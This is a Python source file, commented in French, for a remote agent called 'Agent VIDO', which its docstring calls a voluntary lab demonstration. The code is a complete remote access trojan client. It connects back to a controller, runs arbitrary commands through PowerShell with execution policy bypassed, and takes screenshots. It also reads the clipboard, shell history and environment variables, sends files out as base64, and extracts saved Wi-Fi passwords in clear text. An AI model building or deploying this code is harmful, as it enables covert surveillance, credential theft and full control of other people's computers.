"""
Agent VIDO — à installer volontairement sur les machines du laboratoire.
Se connecte au panel admin et exécute les commandes de démonstration.

Usage:
    python agent.py
    python agent.py --host 192.168.1.10 --port 32000
"""
import argparse
import base64
import hashlib
import json
import logging
import os
import platform
import socket
import struct
import subprocess
import time
from io import BytesIO
from pathlib import Path

try:
    from PIL import Image, ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-7s — %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("agent")

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 32000
AUTH_TOKEN = "vido-lab-2024"
RECONNECT_DELAY = 8
IS_WIN = platform.system() == "Windows"
MAX_OUTPUT_CHARS = 120000


# -----------------------------------------------------------------------
# Protocole
# -----------------------------------------------------------------------

def _recv_exact(sock, n):
    data = b""
    while len(data) < n:
        try:
            chunk = sock.recv(n - len(data))
        except OSError:
            return None
        if not chunk:
            return None
        data += chunk
    return data


def send_msg(sock, msg):
    payload = json.dumps(msg, ensure_ascii=False).encode("utf-8")
    sock.sendall(struct.pack(">I", len(payload)) + payload)


def recv_msg(sock):
    raw_len = _recv_exact(sock, 4)
    if not raw_len:
        return None
    msg_len = struct.unpack(">I", raw_len)[0]
    if msg_len > 50 * 1024 * 1024:
        return None
    raw = _recv_exact(sock, msg_len)
    if not raw:
        return None
    return json.loads(raw.decode("utf-8"))


# -----------------------------------------------------------------------
# Helpers
# -----------------------------------------------------------------------

def run_cmd(cmd, timeout=20):
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout, errors="replace", cwd=os.getcwd(),
        )
        return (r.stdout + r.stderr).strip() or "(pas de sortie)"
    except subprocess.TimeoutExpired:
        return f"[Timeout après {timeout}s]"
    except Exception as e:
        return f"[Erreur: {e}]"


def run_ps(cmd, timeout=20):
    """Lance une commande PowerShell via liste d'args (évite les problèmes d'échappement)."""
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True, text=True, timeout=timeout,
            errors="replace", cwd=os.getcwd(),
        )
        return (r.stdout + r.stderr).strip() or "(pas de sortie)"
    except subprocess.TimeoutExpired:
        return f"[Timeout après {timeout}s]"
    except FileNotFoundError:
        return "[powershell non disponible sur ce système]"
    except Exception as e:
        return f"[Erreur PowerShell: {e}]"


def _truncate_output(text, max_chars=MAX_OUTPUT_CHARS):
    if len(text) <= max_chars:
        return text, False
    suffix = f"\n\n[... sortie tronquee a {max_chars} caracteres ...]"
    return text[:max_chars] + suffix, True


# -----------------------------------------------------------------------
# Handlers
# -----------------------------------------------------------------------

def get_sysinfo():
    info = {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "arch": platform.machine(),
        "cpu": platform.processor() or platform.machine(),
        "cpu_count": os.cpu_count() or 0,
        "username": "?",
        "cwd": os.getcwd(),
        "ram_total": 0,
        "ram_available": 0,
    }
    try:
        info["username"] = os.getlogin()
    except Exception:
        info["username"] = os.environ.get("USERNAME") or os.environ.get("USER", "?")
    if HAS_PSUTIL:
        vm = psutil.virtual_memory()
        info["ram_total"] = vm.total
        info["ram_available"] = vm.available
        info["cpu_count"] = psutil.cpu_count(logical=True) or 0
    return info


def handle_screenshot():
    if not HAS_PIL:
        return {"error": "Pillow non installé (pip install Pillow)."}
    try:
        img = ImageGrab.grab()
        img.thumbnail((1280, 720), Image.LANCZOS)
        buf = BytesIO()
        img.save(buf, format="JPEG", quality=72)
        return {"screenshot": base64.b64encode(buf.getvalue()).decode()}
    except Exception as e:
        return {"error": str(e)}


def handle_processes():
    if IS_WIN:
        out = run_cmd("tasklist /fo csv /nh", timeout=15)
    else:
        out = run_cmd("ps aux --no-header", timeout=15)
    return {"output": out}


def handle_services():
    if IS_WIN:
        out = run_ps("Get-Service | Select-Object Status,Name,DisplayName | Format-Table -AutoSize | Out-String -Width 120")
    else:
        out = run_cmd("systemctl list-units --type=service --state=active --no-pager", timeout=15)
    return {"output": out}


def handle_users():
    if IS_WIN:
        out = run_cmd("query user 2>&1 || net user")
    else:
        out = run_cmd("who -a")
    return {"output": out}


def handle_env_vars():
    env = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))
    return {"output": env}


def handle_uptime():
    if IS_WIN:
        out = run_ps("(Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime | Select-Object Days,Hours,Minutes | Format-List | Out-String")
    else:
        out = run_cmd("uptime")
    return {"output": out}


def handle_disk_usage():
    if HAS_PSUTIL:
        lines = []
        for p in psutil.disk_partitions():
            try:
                u = psutil.disk_usage(p.mountpoint)
                pct = u.percent
                total_gb = u.total / 1024**3
                used_gb = u.used / 1024**3
                free_gb = u.free / 1024**3
                bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))
                lines.append(
                    f"{p.device:<15} [{bar}] {pct:5.1f}%  "
                    f"Utilisé: {used_gb:.1f}G  Libre: {free_gb:.1f}G  Total: {total_gb:.1f}G"
                )
            except Exception:
                pass
        return {"output": "\n".join(lines) or "Aucune partition détectée"}
    if IS_WIN:
        return {"output": run_cmd("wmic logicaldisk get caption,freespace,size /format:csv")}
    return {"output": run_cmd("df -h")}


def handle_installed_sw():
    if IS_WIN:
        out = run_ps(
            "Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',"
            "'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' "
            "| Where-Object {$_.DisplayName} | Select-Object DisplayName,DisplayVersion "
            "| Sort-Object DisplayName | Format-Table -AutoSize | Out-String -Width 100",
            timeout=30,
        )
    else:
        out = run_cmd("dpkg -l 2>/dev/null || rpm -qa 2>/dev/null | head -60", timeout=30)
    return {"output": out}


def handle_clipboard():
    if IS_WIN:
        out = run_ps("Get-Clipboard")
    else:
        out = run_cmd("xclip -selection clipboard -o 2>/dev/null || xsel --clipboard 2>/dev/null")
    return {"output": out or "(presse-papiers vide)"}


def handle_active_window():
    if IS_WIN:
        out = run_ps(
            "Add-Type -AssemblyName System.Windows.Forms; "
            "[System.Windows.Forms.Screen]::AllScreens | Out-String; "
            "$proc = Get-Process | Where-Object {$_.MainWindowTitle} | "
            "Select-Object ProcessName,MainWindowTitle; $proc | Format-Table -AutoSize | Out-String"
        )
    else:
        out = run_cmd("xdotool getactivewindow getwindowname 2>/dev/null || echo 'Non disponible'")
    return {"output": out}


def handle_listdir(path="."):
    try:
        target = os.path.abspath(path or os.getcwd())
        entries = []
        for e in sorted(os.listdir(target)):
            full = os.path.join(target, e)
            is_dir = os.path.isdir(full)
            entries.append({"name": e, "is_dir": is_dir})
        return {"entries": entries, "path": target}
    except Exception as e:
        return {"error": str(e), "entries": [], "path": path}


def handle_file_search(name):
    if IS_WIN:
        out = run_cmd(f'where /r . "{name}" 2>&1 & dir /s /b "{name}" 2>&1', timeout=30)
    else:
        out = run_cmd(f'find . -name "{name}" 2>/dev/null | head -50', timeout=30)
    return {"output": out}


def handle_recent_files():
    if IS_WIN:
        recent = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Recent")
        try:
            files = sorted(Path(recent).iterdir(), key=lambda x: x.stat().st_mtime, reverse=True)
            names = [f.stem for f in files[:40] if f.suffix == ".lnk"]
            return {"output": "\n".join(names) or "(aucun fichier récent)"}
        except Exception as e:
            return {"error": str(e)}
    else:
        out = run_cmd("ls -lt ~/ | head -30")
        return {"output": out}


def handle_file_hash(filepath):
    try:
        h = hashlib.sha256()
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                h.update(chunk)
        size = os.path.getsize(filepath)
        return {
            "output": f"Fichier : {filepath}\nTaille  : {size} octets\nSHA256  : {h.hexdigest()}"
        }
    except FileNotFoundError:
        return {"error": f"Fichier introuvable: {filepath}"}
    except Exception as e:
        return {"error": str(e)}


def handle_read_file(filepath, max_bytes=32768):
    try:
        with open(filepath, "rb") as f:
            raw = f.read(max_bytes)
        try:
            content = raw.decode("utf-8")
        except UnicodeDecodeError:
            content = raw.decode("latin-1", errors="replace")
        truncated = len(content) >= max_bytes
        suffix = "\n\n[... fichier tronqué à 32KB ...]" if truncated else ""
        return {"output": content + suffix}
    except FileNotFoundError:
        return {"error": f"Fichier introuvable: {filepath}"}
    except Exception as e:
        return {"error": str(e)}


def handle_network_info():
    if IS_WIN:
        out = run_cmd("ipconfig /all")
    else:
        out = run_cmd("ip addr show 2>/dev/null || ifconfig -a")
    return {"output": out}


def handle_open_ports():
    if IS_WIN:
        out = run_cmd('netstat -an | findstr "LISTENING"')
    else:
        out = run_cmd("ss -tlnp 2>/dev/null || netstat -tlnp")
    return {"output": out}


def handle_connections():
    if IS_WIN:
        out = run_cmd('netstat -ano | findstr "ESTABLISHED"')
    else:
        out = run_cmd("ss -tnp 2>/dev/null || netstat -tnp")
    return {"output": out}


def handle_dns_lookup(host):
    out = run_cmd(f"nslookup {host}")
    return {"output": out}


def handle_ping_target(host):
    if IS_WIN:
        out = run_cmd(f"ping -n 4 {host}", timeout=15)
    else:
        out = run_cmd(f"ping -c 4 {host}", timeout=15)
    return {"output": out}


def handle_arp_table():
    out = run_cmd("arp -a")
    return {"output": out}


def handle_cmd_history():
    if IS_WIN:
        history_path = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt"
        )
        try:
            with open(history_path, "r", encoding="utf-8", errors="replace") as f:
                lines = f.readlines()[-60:]
            return {"output": "".join(lines)}
        except Exception:
            return {"output": run_ps("Get-History | Format-Table -AutoSize | Out-String")}
    else:
        hist = os.path.expanduser("~/.bash_history")
        try:
            with open(hist, "r", errors="replace") as f:
                lines = f.readlines()[-60:]
            return {"output": "".join(lines)}
        except Exception:
            return {"output": run_cmd("history 60")}


def handle_whoami():
    if IS_WIN:
        out = run_cmd("whoami /all 2>&1 || whoami")
    else:
        out = run_cmd("id && whoami")
    return {"output": out}


def handle_cwd():
    return {"output": os.getcwd()}


def handle_startup_items():
    if IS_WIN:
        out = run_ps(
            "Get-ItemProperty 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' | "
            "Format-List | Out-String; "
            "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' | "
            "Format-List | Out-String",
            timeout=15,
        )
    else:
        out = run_cmd("ls /etc/init.d/ 2>/dev/null; crontab -l 2>/dev/null")
    return {"output": out}


def handle_scheduled_tasks():
    if IS_WIN:
        out = run_cmd("schtasks /query /fo list 2>&1 | head -c 4000", timeout=20)
    else:
        out = run_cmd("crontab -l 2>/dev/null; ls /etc/cron.* 2>/dev/null")
    return {"output": out}


def handle_wifi_profiles():
    if IS_WIN:
        profiles_raw = run_cmd("netsh wlan show profiles")
        lines = [l for l in profiles_raw.splitlines() if "Profil utilisateur" in l or "All User Profile" in l]
        if not lines:
            return {"output": profiles_raw}
        results = ["Profils WiFi enregistrés:\n"]
        for line in lines:
            name = line.split(":", 1)[-1].strip()
            pwd = run_cmd(f'netsh wlan show profile name="{name}" key=clear 2>&1 | findstr "Contenu de la clé\\|Key Content"')
            results.append(f"  SSID : {name}\n  Mot de passe : {pwd.split(':', 1)[-1].strip() if ':' in pwd else '(chiffré ou absent)'}\n")
        return {"output": "\n".join(results)}
    else:
        out = run_cmd("nmcli dev wifi list 2>/dev/null || iwlist scan 2>/dev/null | head -40")
        return {"output": out}


def handle_firewall():
    if IS_WIN:
        out = run_ps("Get-NetFirewallProfile | Select-Object Name,Enabled | Format-Table | Out-String")
    else:
        out = run_cmd("ufw status verbose 2>/dev/null || iptables -L -n 2>/dev/null | head -40")
    return {"output": out}


def handle_antivirus():
    if IS_WIN:
        out = run_ps(
            "Get-MpComputerStatus 2>$null | Select-Object AMServiceEnabled,AntispywareEnabled,"
            "AntivirusEnabled,RealTimeProtectionEnabled,AMProductVersion | Format-List | Out-String; "
            "Get-WmiObject -Namespace 'root/SecurityCenter2' -Class AntiVirusProduct 2>$null | "
            "Select-Object displayName,productState | Format-Table | Out-String",
            timeout=20,
        )
    else:
        out = run_cmd("which clamav clamscan 2>/dev/null; systemctl status clamav-daemon 2>/dev/null | head -5")
    return {"output": out}


def handle_event_logs():
    if IS_WIN:
        out = run_ps(
            "Get-EventLog -LogName System -Newest 20 | "
            "Select-Object TimeGenerated,EntryType,Source,Message | "
            "Format-Table -AutoSize | Out-String -Width 140",
            timeout=20,
        )
    else:
        out = run_cmd("journalctl -n 30 --no-pager 2>/dev/null || tail -30 /var/log/syslog 2>/dev/null")
    return {"output": out}


def handle_shell(cmd):
    if not cmd.strip():
        return {
            "output": "",
            "exit_code": 0,
            "duration_ms": 0,
            "cwd": os.getcwd(),
            "shell": "none",
        }

    started = time.perf_counter()
    shell_name = "cmd"
    try:
        if IS_WIN:
            shell_name = "powershell"
            r = subprocess.run(
                [
                    "powershell",
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-Command",
                    cmd,
                ],
                shell=False,
                capture_output=True,
                text=True,
                timeout=45,
                errors="replace",
                cwd=os.getcwd(),
            )
        else:
            shell_name = "sh"
            r = subprocess.run(
                ["/bin/sh", "-lc", cmd],
                shell=False,
                capture_output=True,
                text=True,
                timeout=45,
                errors="replace",
                cwd=os.getcwd(),
            )

        out = r.stdout + r.stderr
        output = out if out.strip() else "(commande executée sans sortie)"
        output, truncated = _truncate_output(output)
        duration_ms = int((time.perf_counter() - started) * 1000)
        return {
            "output": output,
            "exit_code": r.returncode,
            "duration_ms": duration_ms,
            "cwd": os.getcwd(),
            "shell": shell_name,
            "truncated": truncated,
        }
    except subprocess.TimeoutExpired:
        duration_ms = int((time.perf_counter() - started) * 1000)
        return {
            "output": "[Timeout >45s]",
            "exit_code": -1,
            "duration_ms": duration_ms,
            "cwd": os.getcwd(),
            "shell": shell_name,
            "truncated": False,
        }
    except Exception as e:
        duration_ms = int((time.perf_counter() - started) * 1000)
        return {
            "output": f"[Erreur: {e}]",
            "exit_code": -1,
            "duration_ms": duration_ms,
            "cwd": os.getcwd(),
            "shell": shell_name,
            "truncated": False,
        }


def handle_cd(path):
    try:
        os.chdir(path.strip())
        return {"cwd": os.getcwd()}
    except FileNotFoundError:
        return {"error": f"Répertoire introuvable: {path}"}
    except Exception as e:
        return {"error": str(e)}


def handle_download(filepath):
    try:
        with open(filepath.strip(), "rb") as f:
            data = f.read()
        return {
            "filename": os.path.basename(filepath),
            "size": len(data),
            "data": base64.b64encode(data).decode(),
        }
    except FileNotFoundError:
        return {"error": f"Fichier introuvable: {filepath}"}
    except Exception as e:
        return {"error": str(e)}


# -----------------------------------------------------------------------
# Dispatcher
# -----------------------------------------------------------------------

def dispatch(msg):
    action = msg.get("action", "")
    p = msg.get("data", {})
    try:
        handlers = {
            "sysinfo":        lambda: get_sysinfo(),
            "processes":      lambda: handle_processes(),
            "services":       lambda: handle_services(),
            "users":          lambda: handle_users(),
            "env_vars":       lambda: handle_env_vars(),
            "uptime":         lambda: handle_uptime(),
            "disk_usage":     lambda: handle_disk_usage(),
            "installed_sw":   lambda: handle_installed_sw(),
            "screenshot":     lambda: handle_screenshot(),
            "clipboard":      lambda: handle_clipboard(),
            "active_window":  lambda: handle_active_window(),
            "listdir":        lambda: handle_listdir(p.get("path", ".")),
            "dl":             lambda: handle_download(p.get("file", "")),
            "file_search":    lambda: handle_file_search(p.get("name", "*")),
            "recent_files":   lambda: handle_recent_files(),
            "file_hash":      lambda: handle_file_hash(p.get("file", "")),
            "read_file":      lambda: handle_read_file(p.get("file", "")),
            "network_info":   lambda: handle_network_info(),
            "open_ports":     lambda: handle_open_ports(),
            "connections":    lambda: handle_connections(),
            "dns_lookup":     lambda: handle_dns_lookup(p.get("host", "google.com")),
            "ping_target":    lambda: handle_ping_target(p.get("host", "8.8.8.8")),
            "arp_table":      lambda: handle_arp_table(),
            "shell":          lambda: handle_shell(p.get("cmd", "")),
            "cmd_history":    lambda: handle_cmd_history(),
            "whoami":         lambda: handle_whoami(),
            "cwd":            lambda: {"output": os.getcwd()},
            "cd":             lambda: handle_cd(p.get("path", ".")),
            "startup_items":  lambda: handle_startup_items(),
            "scheduled_tasks":lambda: handle_scheduled_tasks(),
            "wifi_profiles":  lambda: handle_wifi_profiles(),
            "firewall":       lambda: handle_firewall(),
            "antivirus":      lambda: handle_antivirus(),
            "event_logs":     lambda: handle_event_logs(),
            "ping":           lambda: {"pong": True},
        }
        handler = handlers.get(action)
        if handler:
            return handler()
        return {"error": f"Action inconnue: {action}"}
    except Exception as e:
        return {"error": f"Erreur interne [{action}]: {e}"}


# -----------------------------------------------------------------------
# Boucle principale
# -----------------------------------------------------------------------

def run(host, port):
    log.info(f"Agent VIDO démarré — cible: {host}:{port}")
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            log.info(f"Connexion à {host}:{port}...")
            sock.connect((host, port))
            log.info("Connecté.")

            send_msg(sock, {"type": "auth", "data": {"token": AUTH_TOKEN}})
            resp = recv_msg(sock)
            if not resp or resp.get("type") != "auth_ok":
                reason = (resp or {}).get("data", {}).get("reason", "?")
                log.warning(f"Auth refusée: {reason}")
                sock.close()
                time.sleep(RECONNECT_DELAY)
                continue
            log.info("Authentifié.")

            send_msg(sock, {"type": "sysinfo", "data": get_sysinfo()})

            while True:
                msg = recv_msg(sock)
                if not msg:
                    log.info("Connexion fermée.")
                    break
                if msg.get("type") == "command":
                    action = msg.get("action", "?")
                    log.info(f"Commande: {action}")
                    result = dispatch(msg)
                    send_msg(sock, {
                        "type": "response",
                        "action": action,
                        "id": msg.get("id"),
                        "data": result,
                    })
                elif msg.get("type") == "disconnect":
                    break

        except ConnectionRefusedError:
            log.warning(f"Connexion refusée. Nouvelle tentative dans {RECONNECT_DELAY}s...")
        except Exception as e:
            log.error(f"Erreur: {e}")
        finally:
            try:
                sock.close()
            except Exception:
                pass
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Agent VIDO — démonstration académique")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    args = parser.parse_args()
    run(args.host, args.port)
